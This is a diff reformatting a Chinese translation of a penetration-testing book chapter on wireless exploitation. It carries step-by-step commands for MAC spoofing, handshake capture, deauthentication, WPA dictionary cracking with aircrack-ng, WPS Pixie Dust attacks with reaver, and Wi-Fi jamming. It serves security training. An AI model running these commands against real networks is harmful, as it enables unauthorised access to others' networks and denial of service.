@@ -1,4 +1,4 @@
-# 第十章 无线利用
+# 第十章：无线利用
 
 在本章中，我们将涵盖以下内容：
 
@@ -81,9 +81,9 @@
 一旦设备被检测到，使用以下命令进行检查：
 
 ```
-          ifconfig wlan0
+      ifconfig wlan0
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -92,9 +92,9 @@
 1.  让我们检查是否可以启用监视模式。**监视**模式允许具有**无线网络接口控制器**（**WNIC**）的计算机监视从无线网络接收到的所有流量：
 
 ```
-          airmon-ng start wlan0
+      airmon-ng start wlan0
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -103,10 +103,10 @@
 1.  由于我们看到一些潜在有问题的服务正在运行，我们将不得不禁用它们。我们可以通过使用`kill`命令和前面截图中提到的进程 ID（`PID`）来杀死进程：
 
 ```
-          airmon-ng stop wlan0mon
-          kill ( PID's)
+      airmon-ng stop wlan0mon
+      kill ( PID's)
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -129,16 +129,16 @@ MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识�
 1.  在开始之前，请确保通过在其接口上发出停止监视命令来停止在上一个教程中启用的**监视**模式：
 
 ```
-          airmon-ng stop wlan0mon
+      airmon-ng stop wlan0mon
 
-    ```
+```
 
 1.  让我们使用以下命令检查我们设备的 MAC 地址：
 
 ```
-          ifconfig wlan0
+      ifconfig wlan0
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -147,16 +147,16 @@ MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识�
 1.  现在我们将使用以下命令禁用网络接口：
 
 ```
-          ifconfig wlan0 down
+      ifconfig wlan0 down
 
-    ```
+```
 
 1.  现在我们选择一个网络设备，并使用`macchanger`来更改我们的 Mac 地址。我们将把它更改为一个合法的经过身份验证的用户的 Mac 地址，可以通过运行下一个教程中解释的`airodump-ng`命令来找到：
 
 ```
-          macchanger -m xx:xx:xx:xx:xx:xx wlan0
+      macchanger -m xx:xx:xx:xx:xx:xx wlan0
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -165,9 +165,9 @@ MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识�
 1.  在没有 Mac 过滤的情况下，如果用户决定保持匿名，可以从以下位置获取随机的 Mac 地址：
 
 ```
-          macchanger -r wlan0
+      macchanger -r wlan0
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -176,9 +176,9 @@ MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识�
 1.  现在我们可以使用以下命令启用无线设备：
 
 ```
-          ifconfig wlan0 up
+      ifconfig wlan0 up
 
-    ```
+```
 
 ## 还有更多...
 
@@ -197,16 +197,16 @@ MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识�
 1.  如果无线设备未打开，请使用以下命令打开它：
 
 ```
-    ifconfig wlan0 up 
+ifconfig wlan0 up 
 
-    ```
+```
 
 1.  使用以下命令将卡放入监视模式：
 
 ```
-          airmon-ng start wlan0
+      airmon-ng start wlan0
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -215,9 +215,9 @@ MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识�
 1.  现在我们有了一个监视接口，我们将发出：
 
 ```
-    airodump-ng wlan0mon 
+airodump-ng wlan0mon 
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -226,9 +226,9 @@ MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识�
 1.  我们也可以捕获特定的 ESSID；我们只需要提到一个特定的频道并写入一个文件；在这种情况下，我们正在写入一个名为 sniff 的文件：
 
 ```
-          airodump-ng wlan0mon --channel 6 -w sniff
+      airodump-ng wlan0mon --channel 6 -w sniff
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -259,16 +259,16 @@ MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识�
 1.  要确保 wifite 框架已更新，请输入以下命令：
 
 ```
-          wifite -upgrade
+      wifite -upgrade
 
-    ```
+```
 
 1.  要列出所有可用的无线网络，请输入以下命令：
 
 ```
-          wifite -showb
+      wifite -showb
 
-    ```
+```
 
 输出如下截图所示：
 
@@ -279,9 +279,9 @@ MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识�
 1.  使用以下命令再次启动 Wifite：
 
 ```
-          Wifite
+      Wifite
 
-    ```
+```
 
 输出如下截图所示：
 
@@ -290,10 +290,10 @@ MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识�
 1.  正如我们所看到的，该命令已列出了所有检测到的无线网络及其 ESSID、BSSID 等。记住与目标 ID 对应的数字。现在我们应该退出列表模式，并输入以下键盘组合：
 
 ```
-          Ctrl + C
-          3
+      Ctrl + C
+      3
 
-    ```
+```
 
 输出如下截图所示：
 
@@ -334,16 +334,16 @@ WEP 失败的原因是 IV 太短且以明文形式存在；RC4 生成的 24 位�
 1.  首先，我们将使用以下命令将我们的无线设备切换到监视模式：
 
 ```
-          airmon-ng start wlan0
+      airmon-ng start wlan0
 
-    ```
+```
 
 1.  我们可以使用以下命令列出所有可用的无线网络：
 
 ```
-          airodump-ng wlan0mon
+      airodump-ng wlan0mon
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -352,9 +352,9 @@ WEP 失败的原因是 IV 太短且以明文形式存在；RC4 生成的 24 位�
 1.  现在我们已经有了可用无线网络的列表和我们的网络 BSSID 和 ESSID，我们可以开始捕获专门针对该信道的数据包：
 
 ```
-          airodump-ng --bssid xx:xx:xx:xx:xx:xx -c X --write WPACrack        wlan0mon
+      airodump-ng --bssid xx:xx:xx:xx:xx:xx -c X --write WPACrack        wlan0mon
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -363,9 +363,9 @@ WEP 失败的原因是 IV 太短且以明文形式存在；RC4 生成的 24 位�
 1.  现在我们将不得不对现有客户端进行去认证，以捕获他们对无线路由器的握手请求，因为它将包含认证凭据。只有在去认证期间，我们才能成功捕获加密密码：
 
 ```
-          aireplay-ng --deauth 1000 -a xx:xx:xx:xx:xx:xx wlan0mon
+      aireplay-ng --deauth 1000 -a xx:xx:xx:xx:xx:xx wlan0mon
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -376,9 +376,9 @@ WEP 失败的原因是 IV 太短且以明文形式存在；RC4 生成的 24 位�
 1.  现在我们将开始对转储文件进行 WPA 破解。我们需要注意文件名以多个扩展名保存，并根据迭代号添加了`-01`；`rockyou.txt`是一个包含常用密码和字母数字组合的字典，将用于对捕获文件进行猜测密码：
 
 ```
-          aircrack-ng WPACrack-01.cap -w /usr/share/wordlists/rockyou.txt
+      aircrack-ng WPACrack-01.cap -w /usr/share/wordlists/rockyou.txt
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -430,9 +430,9 @@ WEP 失败的原因是 IV 太短且以明文形式存在；RC4 生成的 24 位�
 1.  要扫描启用了 WPS 的路由器，有一个与 Reaver 一起提供的名为`wash`的软件包；输入以下命令以列出启用 WPS 的设备。请注意，需要监视模式来查看信标数据包，了解 AP 是否支持 WPS，并确定 WPS 访问是否被锁定。这有助于我们了解攻击是否可能：
 
 ```
-          wash -i wlan0mon
+      wash -i wlan0mon
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -441,9 +441,9 @@ WEP 失败的原因是 IV 太短且以明文形式存在；RC4 生成的 24 位�
 1.  如果用户出现以下错误，输入以下命令：
 
 ```
-          wash -i wlan0mon -C
+      wash -i wlan0mon -C
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -452,9 +452,9 @@ WEP 失败的原因是 IV 太短且以明文形式存在；RC4 生成的 24 位�
 1.  我们使用`-C`命令来忽略**FCS**（**Frame Check Sequence**）错误。一旦获得 AP 的 BSSID，我们将使用`reaver`命令尝试使用 Pixie Dust 方法进行 WPS 攻击：
 
 ```
-    reaver -i wlan0mon -c 1 -b xx:xx:xx:xx:xx:xx -K X -vv 
+reaver -i wlan0mon -c 1 -b xx:xx:xx:xx:xx:xx -K X -vv 
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -503,9 +503,9 @@ PixieWPS 是一种用于离线暴力破解 WPS PIN 的工具，同时利用了�
 1.  执行 DoS 攻击最简单的方法之一是 Deauth 攻击；在这里，我们将使用`aireplay`通过以下命令对网络执行 Deauth 攻击：
 
 ```
-          aireplay-ng --deauth 100 -a (BSSID) -c wlan0mon
+      aireplay-ng --deauth 100 -a (BSSID) -c wlan0mon
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -514,16 +514,16 @@ PixieWPS 是一种用于离线暴力破解 WPS PIN 的工具，同时利用了�
 1.  Websploit 中还有一些有效载荷；其中一个称为 Wi-Fi 干扰器。在 Kali 终端中使用以下命令执行：
 
 ```
-          websploit
-          use wifi/wifi_jammer
-          show options
-          set bssid xx:xx:xx:xx:xx:xx
-          set essid xx:xx:xx:xx:xx:xx
-          set interface wlanx
-          set channel x
-          run
+      websploit
+      use wifi/wifi_jammer
+      show options
+      set bssid xx:xx:xx:xx:xx:xx
+      set essid xx:xx:xx:xx:xx:xx
+      set interface wlanx
+      set channel x
+      run
 
-    ```
+```
 
 输出将如下截图所示：
 
